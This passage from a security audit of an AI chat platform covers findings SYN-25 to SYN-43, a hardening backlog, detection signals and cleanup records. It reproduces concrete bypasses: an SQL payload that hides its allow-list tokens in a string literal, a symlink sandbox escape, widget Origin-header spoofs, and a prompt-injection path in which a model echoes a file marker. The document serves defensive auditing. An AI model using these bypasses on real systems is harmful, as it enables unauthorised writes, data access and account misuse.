**Reproduction** (admin). `POST /api/v1/admin/models/import/apply {"sql":"UPDATE plugin_data SET data_key = data_key WHERE 1 = 0 AND 'UPDATE BMODELS BSERVICE BTAG BPROVID' <> ''"}` → 200, applied 1 statement (0 rows). The required tokens are satisfied inside a string literal. A `BUSER` variant is refused by the token allow-list; unprefixed tables (`plugin_data`, `messenger_messages`, `doctrine_migration_versions`) are open. A join-based read primitive passed the validator offline only.

**Impact.** An admin (or anyone who can make an admin paste import SQL) writes to tables outside the model catalogue; `messenger_messages` holds PHP-serialised messages.

**Severity.** Medium (admin only). CVSS 3.1 `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L` = 6.7. CWE-89, CWE-184.

**Fix.** Import structured rows through `ModelRepository` instead of SQL; otherwise strip literals before token checks, anchor the statement to `BMODELS`, reject a second table. Test: the statement above → 400.

**Detection.** Proposed: audit log of every applied import statement with the admin id.

---

### SYN-26 Compute sidecar creates files outside the sandbox through a symlink in `/out`

**Where.** `sidecars/synaplan-compute/internal/api/runs.go:501-520` (`promoteWorkOutputs`: `os.Stat(outPath)` follows links, then `s.owner.WriteFile(outPath, body)`); `internal/perm/perm.go:75-99`; `docker-compose.yml:1450` (user 0:0), `:1473` (Docker socket).

**Reproduction** (directly against the sidecar with the backend's token). A run writes `/work/poc.txt` and symlinks `/out/poc.txt → /tmp/audit-inj-sidecar-poc.txt`; the file is created in the sidecar's filesystem (48 bytes, owner 65534:0). Existing files cannot be overwritten. The chat path is traced (`CodeRunRunner.php:402` → `ComputeClient::submitRun`).

**Impact.** Code in the sandbox creates new files anywhere the root sidecar can write. No overwrite, no escalation shown.

**Severity.** Medium. CVSS 5.0. CWE-59.

**Fix.** `Lstat` and skip links; open with `O_CREAT|O_EXCL|O_NOFOLLOW` via `openat` (the `safepath` package already does this for reads); run the sidecar as a non-root user with the Docker group. Test: the PoC run leaves no file outside `/out`.

**Detection.** Proposed: sidecar warns when an `/out` entry is a symlink at promote time.

---

### SYN-27 `install.sh` try mode publishes the dev stack on all interfaces

**Where.** `install.sh:8-10,188-213`; `docker-compose.yml:209,308,944,1097,1234,1553` and mailhog publish on `0.0.0.0` (5173, 8000, 3307, 9999, 8082, 6333, 1025/8025; Keycloak and Ollama with profiles); `:1229-1232` phpMyAdmin auto-login; `:349` static DB credentials; `:1305-1306` Keycloak default admin; `:1018-1022` Centrifugo placeholder secrets and `*` origins; `:330` `APP_ENV=dev`. Done right: `127.0.0.1` binds at `:1366,1404,1494,1532`; `deploy/compose.yaml:467`.

**Reproduction.** `curl localhost:8082/` → 200 phpMyAdmin without login; `curl localhost:6333/collections` → 200.

**Impact.** On a laptop on shared Wi-Fi or a VPS used to "try" the product: database, vector store and mail UI open to the network.

**Severity.** Medium (High on a routable host). CVSS 3.1 `AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 8.8. CWE-1188, CWE-306, CWE-798.

**Fix.** `${SYNAPLAN_BIND:-127.0.0.1}:` on every published port in the dev compose files; warn in `install.sh` when the host has a public address; drop phpMyAdmin auto-login; a compose test like `tests/coolify-compose.test.mjs`. Related: `docker-compose-minimal.yml:174,243,574,594,615`. *(Docker/compose change: "ask first" per AGENTS.md.)*

**Detection.** Not applicable at runtime; the compose test is the guard.

---

### SYN-28 Credentials in public git history

Locations and types only; validity was not tested.

| Commit | File | Type | Removed in |
|---|---|---|---|
| `d96dcb2e067c` (2025-06-29) | `web/inc/_mail.php` | AWS SES SMTP credential pair (access key id + SMTP password) | `b2b253200` |
| `77d3cc79ccd5` (2025-09-16) | `app/inc/_frontend.php` | Cloudflare Turnstile secret | `dd06a0b27` |
| `89c26a6042a0` | `devtests/doc_googlefiles.html` | Google API key inside a saved documentation page (probably that page's public key) | — |

**Severity.** Medium (High if not rotated). CVSS 6.5. CWE-540, CWE-798. **Fix:** rotate both now; enable secret scanning with push protection. **Detection:** provider-side usage logs for the SES identity.

---

### SYN-29 Bearer credentials stored in plaintext

**Where.** API keys: `backend/src/Controller/ApiKeyController.php:198`, `backend/src/Repository/ApiKeyRepository.php:28`. Refresh (30 days), reset and verification tokens: `backend/src/Repository/TokenRepository.php:25,81`; callers `AuthController.php:249,925`, `TokenService.php:142`, `VerificationResendService.php:68`, `AdminPeopleAccountService.php:109`, `PaidAccountCreator.php:131`. Done right: `VerificationTokenRepository.php:55-70` (`createHashedToken`), `CodeSignup.php:82-83`.

**Impact.** Any database read (backup, SQL injection, SYN-05 against a DB admin UI, SYN-27) yields live credentials for every account.

**Severity.** Medium. CVSS 3.1 `AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N` = 5.9. CWE-256, CWE-522. **Fix:** store SHA-256, look up by hash, keep a display prefix column. *(Schema change: "ask first".)*

---

### SYN-30 AI `[IMAGE:…]` marker sets `Message.filePath` without validation (Suspected)

**Where.** Source: `backend/src/Controller/MessageController.php:236-247,259`; `backend/src/Service/Message/AgainHandler.php:256-262,275,319`. Sink A: `StaticUploadController.php:228-244` (the first `Message` with a matching `filePath` decides the owner), `:172`. Sink B: `FileAnalysis/AnalysisFileResolver.php:73-79,119-122`, `ImageAnalysis.php:102`.

**Missing to confirm.** A real model that echoes an attacker-chosen marker (the test provider intercepts). Then: check whether a user can claim another user's upload path, or point analysis at a path outside their directory.

**Severity.** Medium if confirmed. CVSS 5.3. CWE-639, CWE-22. **Fix:** accept the marker only when the path is under the caller's own upload directory and the file exists.

---

### SYN-31 Generated media served anonymously under guessable names (Suspected)

**Where.** `backend/src/Controller/StaticUploadController.php:98-116` skips checks when the basename matches `backend/src/Service/Media/OutboundChannelMedia.php:24-35` (`tts_*`, `ai_i2vsrc_*`, `^\d+_[a-z]+_\d+\.[a-z0-9]+$`). Names: `MediaUploadStore.php:64,134` (user id + provider + unix time), `tts_` + `uniqid()` in five speech providers. Done right: `ai_i2vsrc_` uses 6 random bytes (`MediaUploadStore.php:214`).

**Observed.** Anonymous GET of another account's `…/tts_test_6ad5d87547aba.mp3` → 200 when the path is known. Guessing was not attempted (no mass requests). The path also contains the user id and directory layout.

**Severity.** Medium if guessing is practical. CVSS 5.9. CWE-330, CWE-639. **Fix:** signed expiring URLs as in `MediaAccessTokenService`, or a dedicated directory with 128-bit names.

---

### SYN-32 Login CSRF: OAuth state not bound to the browser; login accepts any content type

**Where.** `backend/src/Service/OAuth/OAuthStateService.php:43-52,65-96` (signature, provider, 600 s only); `AuthController.php:344+` (`json_decode` whatever the `Content-Type`, so a cross-site `text/plain` form works). Done right: `EmailLinkController.php:~118-128` insists on JSON. Related: `KeycloakAuthController.php:73-108` carries the PKCE `code_verifier` in clear inside the state.

**Impact.** A victim's browser is logged in to the attacker's account; data they add lands there. **Severity:** Low. CVSS 5.4 nominal. CWE-352. **Fix:** state-nonce cookie compared in the callback; require `application/json` on login/register/refresh; keep the Keycloak verifier server-side. **Detection:** log state/cookie mismatches after the fix.

### SYN-33 Group directory visible to every user; shares can target a foreign group

**Where.** `backend/src/Controller/ShareController.php:253,563-568`; `backend/src/Service/Iam/ShareService.php:573-632` (people limited to co-members, groups unfiltered), `:729-744` (`assertSubjectExists`: existence only).

**Reproduction.** As a user in no group: `GET /api/v1/iam/subjects` → lists group 10 "Review walk"; `GET /api/v1/groups/10/granted-shares` → 404. The share-to-group write was traced, not executed.

**Severity.** Low. CVSS 5.4 nominal. CWE-200, CWE-285. **Fix:** restrict groups to the actor's memberships in both places unless admin. **Detection:** audit field `actor_is_member=false` on share grants.

### SYN-34 RAG `similar/{chunkId}` uses a foreign chunk as query vector

**Where.** `backend/src/Controller/RagController.php:158-200`; `VectorSearchService.php:423-428`; `QdrantVectorStorage.php:169-193`; `MariaDBVectorStorage.php:176-202`. Done right: `VectorSearchService::passage` `:511-540` (`mayReadChunk`).

**Impact.** Similarity oracle against another tenant's chunk; no foreign text returned. **Severity:** Low. CVSS 3.1. CWE-639. Not reproduced. **Fix:** resolve the chunk through `findChunk` + `mayReadChunk`.

### SYN-35 Public share page leaks an edited-away first question

**Where.** `backend/src/Controller/SharedChatPageController.php:73-111,182-204` (first IN message, no version filter). The JSON endpoint hides superseded edits (`ChatController::getShared` `:964-995`).

**Reproduction.** `GET /shared/<token>` → `<meta name="description" content="my password is HUNTER2-authzA, summarise">` (also `og:description`, `noscript`) for a chat whose first message had been edited. **Severity:** Low. CVSS 4.3. CWE-200. **Fix:** build the description from the same filtered list as the API.

### SYN-36 Widget domain allow-list bypass

**Where.** `backend/src/Service/Widget/WidgetDomainGuard.php:69-101` (prefers the client `x-widget-host` header over Origin/Referer), `:126-165` (`*.example.com` matched with `str_ends_with($host,'example.com')`, no dot). Sibling: `WidgetLegacyController.php:262+`.

**Reproduction.** Allow-list `["*.auditfe-allowed.example","shop.auditfe.example"]`: Origin `evil.example` → 403; Origin `evilauditfe-allowed.example` → 200; Origin `evil.example` + `X-Widget-Host: shop.auditfe.example` → 200. **Severity:** Low (the list is anti-embedding, not access control; say so in `docs/WIDGET.md`). CVSS 5.3 nominal. CWE-346, CWE-185. **Fix:** ignore the header when Origin is present; match on `'.'.suffix`.

### SYN-37 Internal `tools:` prompts readable by any signed-in user

**Where.** `backend/src/Controller/PromptController.php:765-790` — owner 0 skips the access check. `GET /api/v1/prompts/372` as a level-NEW user returns `tools:chat_loop`. The list endpoint hides them. **Severity:** Low. CVSS 4.3. CWE-200. **Fix:** 404 for owner-0 prompts whose topic starts with `tools:` unless admin.

### SYN-38 `/api/test/*` public in every environment

**Where.** `backend/config/packages/security.yaml:148`; `backend/src/Controller/TestController.php:25-37`; `TestMessageController.php:14`. `curl localhost:8000/api/test/embed` → 200 with a 1024-dim vector from the default embedding provider; no env gate, no limiter. **Impact:** unauthenticated cost amplification. **Severity:** Low. CWE-489. **Fix:** register only `when@dev` / `when@test`; prod-kernel router test. **Detection:** access-log count on `/api/test/` in production should be zero.

### SYN-39 Compute sidecar: root and Docker socket behind a fixed default token

**Where.** `docker-compose.yml:1446-1480` (`user: "0:0"`, Docker socket, `COMPUTE_AUTH_TOKEN` default), `:391-393`; `deploy/compose.yaml:790,808`; `sidecars/synaplan-compute/internal/auth/bearer.go:36-49`; `docker-compose.egress.yml:21,89`. The sidecar does not check `owner` on `GET /v1/workspaces/{id}/files*` or `/v1/runs/{id}*`. No escape was found; with SYN-05's `fetchApi` (attacker-chosen bearer, GET only) this is cross-tenant read on installs that kept the dev token. **Severity:** Low. CVSS 4.6. CWE-1188, CWE-250. **Fix:** refuse the well-known default outside dev; own network shared only with backend/worker; owner check in the sidecar; socket proxy.

### SYN-40 Crypto hygiene: one `APP_SECRET` for three token families; CBC without a MAC

**Where.** `backend/src/Service/Auth/TokenService.php:409-415,455-458`, `OAuthStateService.php:101-108,146-149`, `NativeAuthHandoffService.php:57,80` sign with the raw `APP_SECRET` in the same format; no empty/placeholder guard at boot. All signers were checked: fixed keys, disjoint claims, no forgery today. `backend/src/Service/Security/EncryptionService.php:15-24,36-50,78-90` is AES-256-CBC, one key, no MAC, no row binding; all decrypt inputs come from the database (no remote oracle). Done right: `MediaAccessTokenService.php:149`, `WopiTokenService.php:89`, `TokenCipher.php:21`, `RealtimeTokenService.php:101-106`. **Severity:** Low. CWE-323, CWE-353. **Fix:** HKDF per purpose; boot check in prod; v2 format with XChaCha20-Poly1305 and AAD `group|setting|ownerId`.

### SYN-41 First-run setup needs no operator proof (Suspected)

**Where.** `backend/src/Controller/SetupController.php` (`createFirstAdmin`), `SetupStateService.php:83-98`. While the wizard is open and the user table is empty, the first network client becomes admin. The race is handled; the missing piece is a secret. Could not be exercised (the stack has users). `SetupLockdownSubscriber.php:44` also leaves `/oauth/*`, `/internal/voice`, `/widget.php`, `/up`, `/shared` reachable during setup. **Severity:** Low (Medium on an internet-reachable fresh install). **Fix:** one-time setup token printed to the container log.

### SYN-42 CSV/XLSX formula injection through the widget session id

**Where.** `WidgetTurnGate.php:46,63`; `WidgetSessionResolver.php:37`; `WidgetSessionService.php:71`; `WidgetExportService.php:159,515`. The visitor-chosen session id is written to export cells unescaped. **Severity:** Low. CWE-1236. **Fix:** validate `^[A-Za-z0-9_-]{8,64}$` (better: server-issued ids) and apply `sanitizeCellValue`.

### SYN-43 Renderer/parser weaknesses not shown exploitable (Suspected)

| Item | Where | Why not confirmed |
|---|---|---|
| Badge placeholders rewritten on the HTML string after sanitising | `frontend/src/components/MessageText.vue:480-484,494,577-600,807-820` | Chromium 156 entity-encodes `<`/`>` in attributes; needs an older engine or WebView |
| Artifact preview CSP inserted by regex | `frontend/src/utils/chatArtifacts.ts:52-57`, `ArtifactPanel.vue:54-58` | `sandbox="allow-scripts"` still isolates the app |
| ffmpeg accepts playlist content under a media extension | `FileProcessor.php:1433,1734`, `WhisperService.php:377`, `MetaProvider.php:569`, `TelegramVoiceConverter.php:37`, `ThumbnailService.php:210` | not exercised; add `-format_whitelist` / `-protocol_whitelist` |

## 5. Ruled out

**Authorization**
- Admin routes as a normal user: all 130 method/route combinations → 403 (class/method `IsGranted`, private guards, `isAdmin()`).
- 39 cross-tenant requests against memories, widgets, MCP servers, prompts, agents (read, update, delete, reference from own object): all refused.
- Chats: read/write/share/archive/tags/export/copy guarded by `ChatController::denyConversation` `:1122-1141`, `ChatLibraryController.php:209`.
- Messages (except SYN-10): export, memories, ask-user, again, versions, feedback, save-cancelled, stop-stream, stream re-attach all owner-checked.
- Files by id: `FileController::isFileAccessibleByUser` `:1807-1830`; media token is HMAC, purpose-bound, 30 min, user-scoped.
- Stream as a signed-in user: foreign `chatId`, `fileIds`, `continueMessageId`, quote, `promptId` refused.
- Self-escalation: `User::getRoles()` derives admin only from level or mapped OIDC roles; `ProfileController.php:234-248` allow-lists fields; no API Platform resources exposed.
- Plugin `{userId}` guard present on every method (Synaform 49/49, synafastbill 6/6, castingdata 3/3).
- Realtime channels: user, widget-operator and widget-session authorizers refuse foreign subscriptions.
- RAG: every vector query carries `user_id` or explicit owner scopes (`RagScopeFilter`); passage by id uses `mayReadChunk`; memory ids are namespaced per user.
- Guest chat binding to its own session chat (`StreamTurnPreparer.php:142-151`).
- Public share token: 96 bits; un-share → 404.

**Authentication**
- JWT `alg` confusion / `none`: asymmetric allow-list (`JwtValidator.php:41-48`); Apple token `iss`/`aud` enforced.
- OIDC/Keycloak cross-provider merge by email: refused (`OidcUserService.php:73-125`).
- Access-token forgery: HMAC-SHA256 with `hash_equals`; the running stack does not use the placeholder secret (compared without printing).
- Suspended/deleted/pending accounts blocked in every authenticator; restricted API keys default-deny; must-change-password lock.
- Token entropy and single use (reset reuse → 400, refresh after revoke → 401); native handoff 120 s single-use; desktop pairing code space, TTL and limiter.
- Cookies: HttpOnly, Secure from `APP_URL`, SameSite Strict in prod; no user-controlled OAuth redirect; forwarded-IP headers honoured only behind a trusted hop.
- Setup re-entry after users exist: lock + recheck → 409.

**Webhooks and machine-to-machine**
- Stripe (`constructEvent`, idempotency; unsigned → 400), Telegram (per-bot secret, `hash_equals`, dedupe), saved-task webhooks (token + optional HMAC + limiter), voice sidecar (HMAC over timestamp + body), WOPI (token bound to file, user, purpose, 600 s; owner re-checked), Google IAP (state re-read from Play API).
- `/mcp` anonymous: `initialize` / `ping` / `tools/list` only; chat ownership checked in tools.
- OAuth server edge: PAR/token/revoke need `private_key_jwt`; S256 only.
- The 78 `PUBLIC_ACCESS` rules: no rule matches an unintended route in this build.

**SSRF and sandbox**
- `AnalyzeImageTool` (prior advisory): https, guard, no redirects, pinned, fails closed.
- Custom HTTP tools, MCP client/discovery/registration, federation peers, platform links: pinned and fail closed, or checked on the dialled address.
- News image proxy: host allow-list, `image/*` only. Gateway `image_url`: passed to the provider, never fetched.
- Non-http schemes, decimal/octal/short IPv4, IPv4-mapped, 6to4, compose names, `*.nip.io` → loopback: blocked by the guard.
- Sandbox: uid 65534, loopback only, no socket, zero capabilities, `NoNewPrivs`, seccomp, read-only rootfs, no secrets in env; artefact/workspace reads use `openat` + `O_NOFOLLOW`; no shell string in the run contract; workspace id never client-supplied.
- Egress gateway logic (static): CONNECT only, single-use grants, private pins dropped.

**Injection, files, parsing**
- Prior advisories: upload path traversal (`UploadRequestPath`, variants → 404) and uploaded-HTML XSS (CSP sandbox + nosniff) are fixed.
- Plugin asset traversal (`realpath` containment, live 404); `/up` and `/files/uploads` private files (anon 401, other user 403).
- SQL: allow-listed identifiers and bound parameters in all dynamic queries reviewed; no `unserialize` on application data; no XXE flags; no archive `extractTo`; no Twig `createTemplate`; processes use argv arrays; mail via Symfony Mime; `Content-Disposition` sanitised.
- Upload extension allow-list; downloads served as attachment; widget icon type sniffing.

**Frontend**
- Script execution through the main chat render path: DOMPurify + link scheme checks + morphdom; KaTeX `trust: false`; Mermaid strict; code blocks; feedback view; widget print export; widget config sinks; plugin view; shared-chat page escaping; human-check page; synascriber silent page.
- Clickjacking (`X-Frame-Options: SAMEORIGIN`); credentialed CORS (no `allow_credentials`); open redirects; email templates (no `|raw`); Cloudflare worker.

**Gateway and commerce**
- `/v1/*` without a key → 401; aborted streams metered; provider/base URL not client-supplied; budget checked per request; unknown models not zero-cost; tool calls metered; free-API key confined.
- Stripe checkout session ownership, server-side price mapping, top-up double credit (unique index), pay-first account lock, signup-code conditional UPDATE.

**Infrastructure and supply chain**
- `composer audit --locked`: 0 advisories; `npm audit --omit=dev` (frontend, cloudflare, root): 0.
- GitHub workflows: no `pull_request_target`, SHA-pinned actions, `contents: read` default, gated publish, no untrusted interpolation.
- Production: secrets generated by `deploy/scripts/secrets-init.sh`, internal network, digest pins, `APP_ENV=prod`, sandbox network none; 503 `SETUP_REQUIRED` until the wizard; AWS IMDSv2 and encrypted EBS.
- Randomness (`random_bytes` for all secrets); password hashing `auto`; provider keys masked in API responses; sidecar constant-time compares; no profiler bundle.

## 6. Hardening backlog (prioritised)

**P0 — close the root causes**
1. **Explicit principal type.** Replace "substitute a real `User`" for widget visitors, guests and inbound channels with `user | widgetSession | guestSession | channelSender`. An owner check must not be able to pass for a visitor. Add an architecture test banning bare `->find($id)` on Chat/Message/File in controllers and `Service/Chat/Stream/`.
2. **One guarded outbound client.** Every user- or model-supplied URL goes through a client that checks the dialled address per hop (`NoPrivateNetworkHttpClient`), with `max_redirects: 0` as the framework default. Architecture test: `SsrfGuard::isBlockedUrl` may not be used without it; plugins receive the guarded client.
3. **Authenticate every inbound channel.** A shared HMAC helper (the `VoiceLiveInternalAuth` shape) and a test that walks the router and fails when a webhook route has no verifier.
4. **No state change on GET.** Router test: no cookie-authenticated GET route writes; delete `/api.php` or make it POST-only; `Sec-Fetch-*` subscriber.
5. **Rotate** the two credentials in git history (SYN-28) and enable push protection.

**P1 — reduce blast radius**
6. Content-Security-Policy for the app and widget (`img-src 'self' data: blob:`, `report-to`); HSTS in every Caddyfile, not only `deploy/aws/caddy/Caddyfile.domain:24`.
7. Run PHP workers and the compute sidecar as non-root; socket proxy for Docker.
8. Give Qdrant an API key, Redis a password and Tika basic auth even on the internal network; separate the data network from the one URL-fetching workers sit on. Redis also carries Messenger PHP-serialised messages, nonces, PKCE and rate-limit state (`allkeys-lru` in prod can evict them).
9. Session ids in access tokens; hashed storage for API keys and tokens; HKDF per purpose; refuse to boot in prod with a placeholder `APP_SECRET`.
10. Two-tenant functional matrix in CI (user A's ids requested as B, as widget visitor, as guest, anonymously) for every route that takes an id.
11. `access_control` backstop `^/api/v1/admin → ROLE_ADMIN` plus a router test; unify `IsGranted('ROLE_ADMIN')` and `isAdmin()` (an OIDC-mapped admin gets a partial surface today).
12. Anchor the prefix-only `PUBLIC_ACCESS` regexes, add `methods:`, remove dead rules (`:84`, `:240`); test that fails when a public rule matches a route not on an allow-list.
13. ImageMagick `policy.xml` and ffmpeg protocol/format allow-lists.
14. Bind dev compose ports to `127.0.0.1`.

**P2 — defence in depth**
15. Non-sequential public ids for chats, files and messages; uniform 404 for "not yours" and "does not exist".
16. Server-issued widget session ids; per-address limits on widget and guest session creation.
17. Mark fetched pages, file text, RAG chunks and MCP results as untrusted for the model and record on the run that untrusted content was read; approvals keyed on that flag.
18. Remove `/api/test/*` from production; reduce `/api/health` (lists configured providers and error text); gate the 2.7 MB OpenAPI document.
19. `_docker/backend/Caddyfile:72-78` applies an immutable cache header by extension to PHP routes (cache-deception risk; observed on `/api/v1/files/uploads/x/y.png`, `/shared/abc.js`); nelmio_cors reflects every origin.
20. Stop returning transport error strings to users (OpenAPI import, URL watch, IMAP, widget API test).
21. Do not log the phone verification code (`PhoneVerificationController.php:192-197`); scrub main log channels (`monolog.yaml:36,51`); RAG queries are written with `error_log`.
22. Gateway: reserve estimated cost at admission; clamp client `max_tokens`; record usage when a stream throws after partial output.
23. IAP notification routes: rate limit, Pub/Sub token check. Saved-task HMAC lacks a timestamp; voice HMAC lacks a nonce.
24. Notify account owners on new external identity, new connection, password change, revoke-all.
25. Reduce the shared-chat DTO (internal ids, file path with user id, cost, model keys); rotate the share token on un-share.
26. `/api/v1/news/image` and `PluginAssetResponder` serve SVG/HTML inline without CSP; escape LIKE wildcards (`FileRepository.php:551`, `UsageStatsService.php:809`, `AdminController.php:154`, `OidcUserService.php:231-234`); `JwtValidator.php:137,161` accepts tokens without `exp` and skips `aud` when none is configured.
27. `govulncheck` for the Go sidecars and an image scan in CI; pin coolify/quickstart images by digest.

**Detection engineering summary**

| Signal | Covers | Source |
|---|---|---|
| Webhook request without a valid signature / from a non-poller address | SYN-01, SYN-08 | new log field + alert |
| Widget or guest request naming a `chatId` / `fileIds` not bound to its session | SYN-02, SYN-13 | warn log in `StreamTurnPreparer`, `WidgetConversation` |
| Widget session whose chat source is not `widget` | SYN-02 (retro-hunt) | SQL on widget sessions ⋈ chats |
| Typed URL with non-canonical host; dialled address private; redirect hop to private host | SYN-05, SYN-06, SYN-07, SYN-24 | guarded client |
| Backend user agent in Qdrant/Tika access logs from URL-reading paths | SYN-05–07 | data-service logs |
| GET on `/api/v1/messages/stream` or `/api.php`; cookie-auth request with `Sec-Fetch-Dest: image` | SYN-09 | access log |
| One account requesting many distinct message ids | SYN-10 | access log |
| `/auth/token` mint for a user with no live refresh row; `token=` on non-stream routes | SYN-11 | new log line |
| Resolved file path outside the user's directory | SYN-03, SYN-30 | new log line |
| External identity linked to an existing account; social login adopting an unverified account | SYN-04, SYN-18 | audit event |
| OAuth callback where session user ≠ state owner | SYN-19 | new log field |
| Failed-login and reset-request counters per account and address | SYN-17 | limiter 429s |
| Write to an owner-0 prompt | SYN-15 | audit event |
| CSP violation reports | SYN-16 | report endpoint |
| IAP refunded → active; purchase id on more than one account | SYN-23 | periodic query |

## 7. Coverage gaps

**Not testable locally (module off, flag off, or third party required)**
- SYN-04 and the merge step of SYN-18 (real Apple/Google/GitHub consent); SYN-08 POST end to end; SYN-19 end to end; Telegram and federation live paths; Stripe flows, pay-first checkout, code signup, email-link sign-in; real Apple/Google receipts; `/v1/messages` (disabled locally).
- No real model was available. Prompt-injection-driven paths (SYN-16, SYN-22, SYN-30, `web_fetch` / link reading / `analyze_image` / `code_execution` through the model loop) are shown by renderer, policy and code behaviour, not by a model following injected text.
- DNS rebinding against unpinned callers; a real public first hop for SYN-06; SYN-31 path guessing; SYN-41 on an empty database.

**Not reviewed or reviewed only at the edge**
- OAuth server internals (`OAuthServerController` authorize/token, redirect-URI matching, code reuse, consent, refresh rotation).
- `McpController` tool layer after authentication; plugin tools; custom HTTP tool executor internals; document tool loop; memory-add and file-ingest executors.
- Synaform nested lookups below the `{userId}` guard, its frontend, and whether a user can enable `P_synaform.enabled` for themselves; synascriber and synafastbill plugins; marketeer pages (not in this checkout).
- Legacy `/api.php` actions other than `promptUpdate`; other GET routes were screened by name only.
- Public `ConfigController` endpoints, `HumanCheckPageController`, `PlatformInstanceController::public`, widget `human-handoff`, `WidgetLegacyController`, synascriber public transcriber routes.
- Agent pin resolution, `PromptController` file linking, widget owner API, `ConversationCopyService`, bundle import internals, IAM group-share positive path, group-admin vs instance-admin boundaries, admin functional abuse.
- API-key scope behaviour (static only: low-level users cannot mint keys) including the API-key → session exchange in SYN-11.
- Saved-task unattended runs; Notion/Dropbox/M365 sync as injection sources; chat-run cost limit and loop detection (flag off); gateway admission for embeddings/images/audio/research.
- Egress gateway and compute egress proxy at runtime (overlay not running); persistent-workspace runs and WebDAV push; C2PA signer end to end; WOPI put/lock; Tika/Collabora inputs; voice, transcriber and watchdog sidecars (source only).
- Go sidecars have no vulnerability scan (`govulncheck` not installed); no container image scan; casaos/umbrel/elestio/aws scripts only searched; git-history secret scan was pattern-based.
- Capacitor shells, Firefox/Safari rendering, the built widget bundle, production Caddy/Cloudflare behaviour (config only), migrations.

## Appendix A. State left on the local stack by the audit

Nothing in the repository was changed. The following local state remains and is the maintainer's to clean up; nothing was reverted without a decision.

| Item | Detail |
|---|---|
| **Global prompt metadata changed** | `GET /api.php?action=promptUpdate&topic=general&tool_files=1` (SYN-15) rewrote `BPROMPTMETA` for system prompt `general` (`BPROMPTS.BID=1`): rows 729 `aiModel=-1` (loader default), 730 `tool_mcp=1` (value existed before), 731 `tool_files=1` (new). Likely revert: `DELETE FROM BPROMPTMETA WHERE BID IN (729,731);` |
| Seeded demo account | One message and a canned reply in the demo user's previously empty chat 594 |
| Environment file fetched once | During SYN-03 a reviewer requested the backend environment file through the plugin endpoint (200, length only); the body was discarded and not logged. Treat local keys as unexposed outside this machine |
| Compute sidecar | The binary was started a second time inside its container (startup orphan sweep ran, then exit on port conflict); 48-byte marker `/tmp/audit-inj-sidecar-poc.txt` in `synaplan-compute` |
| Admin model import | One no-op `UPDATE … WHERE 1 = 0` applied (SYN-25) |
| Test accounts | Users 4915–4929 (`audit-*@example.com` / `.test`) with their chats, widgets, files, widget and guest sessions, Mailhog mail; 4920–4922 hold PRO from forged local IAP receipts; one castingdata config row with a dummy key on 4924; API key id 42 created and revoked |
| Possible non-local request | One `/api/v1/checkout/claim` probe with a made-up session id may have caused a single Stripe lookup from the backend (Stripe is not configured locally, so it most likely failed before any network call) |
| Scratch files | Cookie jars and test-account password files in the session scratch directory and a temp directory under `/tmp` (test accounts only) |

### Cleanup performed after the audit (maintainer-approved)

| Item | Result |
|---|---|
| Test users 4915–4929 | Deleted through `DELETE /api/v1/admin/users/{id}` (`UserDeletionService`); no rows left in any user-keyed table, no upload files, no Qdrant points |
| Global prompt metadata | `BPROMPTMETA` rows 729 and 731 deleted; row 730 (`tool_mcp=1`, value that existed before) kept |
| Demo chat 594 | The two audit messages and their metadata deleted. The chat title and its search-index entry were set by that turn and were left as they are (previous title unknown) |
| Guest chats 4707/4708, guest sessions, files 359 and 363 | Deleted, including the leftover upload on disk |
| Mailhog | 44 messages to the audit addresses deleted |
| Scratch cookie jars and password files | Deleted |
| Not removed | 48-byte marker `/tmp/audit-inj-sidecar-poc.txt` in the compute container (image has no shell; it goes away when the container is recreated). Pre-existing `audit-tool-*@test.synaplan.com` accounts and older orphan widget sessions are not from this audit and were not touched |
